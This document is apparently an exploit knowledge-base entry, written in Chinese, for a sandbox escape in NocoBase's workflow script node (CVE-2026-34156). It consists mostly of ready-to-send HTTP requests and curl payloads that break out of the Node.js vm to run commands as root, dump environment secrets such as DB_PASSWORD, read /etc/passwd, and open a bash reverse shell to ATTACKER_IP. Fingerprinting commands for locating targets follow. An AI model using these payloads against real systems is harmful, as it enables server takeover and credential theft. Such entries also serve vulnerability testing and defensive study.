---
id: NOCOBASE-SANDBOX-RCE
title: NocoBase 工作流脚本 VM 沙箱逃逸 RCE
product: nocobase
vendor: NocoBase
version_affected: "< 2.0.28"
severity: CRITICAL
tags: [rce, sandbox_bypass, vm, workflow, low_code, 需要认证]
fingerprint: ["nocobase", "NocoBase", "/api/flow_nodes", "/api/users:signin"]
---

## 漏洞描述

NocoBase 是开源无代码/低代码平台。CVE-2026-34156: 工作流脚本节点使用 Node.js `vm` 沙箱执行用户代码，但传入的 `console` 对象暴露了宿主 `WritableWorkerStdio` 流对象。攻击者通过原型链遍历可逃逸沙箱，以 root 身份执行任意命令。

**前提**: 需要认证用户（拥有工作流编辑权限）

## 影响版本

- NocoBase < 2.0.28

## 前置条件

- 目标运行 NocoBase 且可通过网络访问
- 需要认证用户（拥有工作流编辑权限）
- 可尝试默认凭据或通过 `/api/users:signin` 接口登录

## 利用步骤

### 沙箱逃逸 RCE

```http
POST /api/flow_nodes:test HTTP/1.1
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "type": "script",
  "config": {
    "content": "const Fn=console._stdout.constructor.constructor;const proc=Fn('return process')();const cp=proc.mainModule.require('child_process');return cp.execSync('id').toString().trim();",
    "timeout": 5000,
    "arguments": []
  }
}
```

**响应**:
```json
{"data":{"status":1,"result":"uid=0(root) gid=0(root) groups=0(root)","log":""}}
```

### 逃逸链分析

```
console._stdout                           → 宿主 WritableWorkerStdio
  .constructor                            → WritableWorkerStdio 类
  .constructor                            → 宿主 Function 构造器
Function('return process')()              → Node.js process 对象
  .mainModule.require('child_process')    → 无限制模块加载
  .execSync('id')                         → RCE (uid=0)
```

### 读取环境变量（泄露数据库密码）

```http
POST /api/flow_nodes:test HTTP/1.1
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "type": "script",
  "config": {
    "content": "const Fn=console._stdout.constructor.constructor;const proc=Fn('return process')();return JSON.stringify(proc.env);",
    "timeout": 5000,
    "arguments": []
  }
}
```

返回 `DB_PASSWORD`, `INIT_ROOT_PASSWORD` 等敏感环境变量。

### 反弹 Shell

```http
POST /api/flow_nodes:test HTTP/1.1
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "type": "script",
  "config": {
    "content": "const Fn=console._stdout.constructor.constructor;const proc=Fn('return process')();const cp=proc.mainModule.require('child_process');cp.execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"');return 'done';",
    "timeout": 30000,
    "arguments": []
  }
}
```

### 替代逃逸向量

```javascript
// 通过 stderr
console._stderr.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()

// 通过 Error.prepareStackTrace (V8 CallSite API)
// Error.prepareStackTrace + CallSite.getThis()
```

### 读取任意文件

```json
{
  "type": "script",
  "config": {
    "content": "const Fn=console._stdout.constructor.constructor;const proc=Fn('return process')();const fs=proc.mainModule.require('fs');return fs.readFileSync('/etc/passwd','utf8');",
    "timeout": 5000,
    "arguments": []
  }
}
```

## Payload

### 沙箱逃逸执行命令

```bash
curl -X POST "http://target/api/flow_nodes:test" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"type":"script","config":{"content":"const Fn=console._stdout.constructor.constructor;const proc=Fn(\"return process\")();const cp=proc.mainModule.require(\"child_process\");return cp.execSync(\"id\").toString().trim();","timeout":5000,"arguments":[]}}'
```

### 读取环境变量（泄露数据库密码）

```bash
curl -X POST "http://target/api/flow_nodes:test" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"type":"script","config":{"content":"const Fn=console._stdout.constructor.constructor;const proc=Fn(\"return process\")();return JSON.stringify(proc.env);","timeout":5000,"arguments":[]}}'
```

### 读取任意文件

```bash
curl -X POST "http://target/api/flow_nodes:test" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"type":"script","config":{"content":"const Fn=console._stdout.constructor.constructor;const proc=Fn(\"return process\")();const fs=proc.mainModule.require(\"fs\");return fs.readFileSync(\"/etc/passwd\",\"utf8\");","timeout":5000,"arguments":[]}}'
```

## 验证方法

- 响应 JSON 中 `result` 字段包含 `uid=0(root)` 即确认沙箱逃逸 RCE
- 环境变量读取响应中包含 `DB_PASSWORD` 等敏感信息即确认

```bash
curl -s -X POST "http://target/api/flow_nodes:test" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"type":"script","config":{"content":"const Fn=console._stdout.constructor.constructor;const proc=Fn(\"return process\")();const cp=proc.mainModule.require(\"child_process\");return cp.execSync(\"id\").toString().trim();","timeout":5000,"arguments":[]}}' | grep -o '"result":"[^"]*"'
```

## 指纹确认

```bash
curl -s http://target:13000/ | grep -i nocobase
curl -s http://target:13000/api/app:getLang
curl -s http://target:13000/api/users:signin -X POST -d '{}' -H "Content-Type: application/json"
```
